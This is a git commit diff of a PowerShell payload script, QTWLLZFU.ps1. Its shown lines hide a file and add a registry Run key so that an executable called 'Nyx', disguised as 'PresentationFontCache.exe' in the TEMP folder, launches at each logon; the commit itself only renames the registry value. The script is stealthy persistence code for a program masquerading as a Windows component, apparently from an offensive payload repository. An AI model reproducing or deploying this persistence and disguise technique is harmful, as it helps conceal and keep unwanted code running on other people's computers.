1300613553bd8b76fb15fbfd2aadfe69639a62ba
VVolfCZ <83589607+VVolfCZ@users.noreply.github.com>
2023-03-14 17:28:16 +0100

    Update QTWLLZFU.ps1

--- QTWLLZFU/QTWLLZFU.ps1
+++ QTWLLZFU/QTWLLZFU.ps1
@@ -24,7 +24,7 @@ $FILE.attributes='Hidden'
 
 # Add Nyx to startup processes
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
--Name "VCEC342Z" `
+-Name "QTWLLZFU" `
 -Value "$env:TEMP\PresentationFontCache.exe"
 
 # Run Nyx
